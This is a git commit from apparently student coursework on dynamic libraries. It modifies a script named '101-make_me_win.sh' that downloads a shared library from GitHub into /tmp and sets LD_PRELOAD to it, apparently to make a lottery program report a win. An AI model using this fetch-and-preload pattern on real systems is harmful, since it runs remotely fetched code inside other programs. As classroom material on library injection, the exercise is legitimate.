ac5959580a83460e37b5887704e638475a936e96
Nate Petersen <nate.petersen@me.com>
2019-05-06 23:34:00 +0000

    corrected virus for winning lottery

--- 0x17-dynamic_libraries/101-make_me_win.sh
+++ 0x17-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget https://github.com/blueExcess/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/winning.so
-export LD_PRELOAD=$PWD/winning.so
+wget -O /tmp/winning.so https://github.com/blueExcess/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/winning.so
+export LD_PRELOAD=/tmp/winning.so
